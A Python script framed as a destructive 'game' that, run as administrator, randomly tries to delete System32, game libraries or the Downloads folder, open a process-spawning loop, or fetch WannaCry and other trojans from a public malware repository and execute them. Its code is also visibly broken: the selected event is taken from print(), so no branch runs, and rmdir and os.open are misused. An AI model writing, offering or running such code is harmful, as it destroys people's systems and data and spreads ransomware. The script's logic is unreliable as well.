import time
import random
import os
import webbrowser
def delsystem32():
    #pretty self explanatory, finds the system32 folder and removes it.
    os.rmdir("C:\Windows\System32")
def delallgames():
    #every single games you have on steam, gog and epic just removed. maybe even p!rated games with C:/games.
    os.rmdir("C:\Program Files (x86)\Steam\steamapps\common")
    os.rmdir("C:\GOG Games")
    os.rmdir("C:\Program Files (x86)\GOG.com")
    os.rmdir("C:\Games")
    os.rmdir("C:\Program Files\Epic Games")
def downloadmalware():
    #this one is the second scariest one. since yknow, system32. it will download malware from the malware repo Da2dalus (thank you for this :3)
    webbrowser.open("https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Ransomware/WannaCry.exe")
    webbrowser.open("https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Ransomware/CoronaVirus.exe")
    webbrowser.open("https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/000.exe")
    webbrowser.open("https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/BlueScreen.exe")
    time.sleep(4)
    #this will wait for the downloads to finish, then run it all.
    os.open("C:\Downloads\WannaCry.exe")
    os.open("C:\Downloads\CoronaVirus.exe")
    os.open("C:\Downloads\BlueScreen.exe")
def crashtry():
    #tries to crash you by opening so many junk. i have no idea how well this works but probably not very good. the least dangerous from all of these.
    run = True
    while run == True:
        webbrowser.open("https://www.google.com")
        os.open("C:\Windows\explorer.exe")
        os.open("C:\Windows\Notepad.exe")
        os.open("C:\Windows\System32\Taskmgr.exe")
def deldownloads():
    #deletes everything in your downloads.
    os.rmdir("C:\Downloads")
events = ["you got: deleting system32", "you got: deleting all games", "you got: downloading malware", "you got: crashtry", "you got: delete downloads folder"]
print("Welcome to Press that button! a VERY destructive 'game' where you press a button, and destructive computer things happen!")
print("WARNING - this script is VERY dangerous. it can go from just opening random stuff, to deleting system32 and downloading malware. i am NOT responsible for any damage caused. please run this with safe measures.")
print("also, PLEASE run this script as administrator. it will not work without it.")
starting = input("type 'start' to start the game!\n")
if starting == "start":
    button = input("now, would you like to press the button?\n")
    if button == "yes":
        destruct = print(random.choice(events))
        if destruct == "you got: deleting system32":
            delsystem32()
        elif destruct == "you got: deleting all games":
            delallgames()
        elif destruct == "you got: downloading malware":
            downloadmalware()
        elif destruct == "you got: crashtry":
            crashtry()
        elif destruct == "you got: delete downloads folder":
            deldownloads()
    elif button == "no":
        print("ok... goodbye then?")
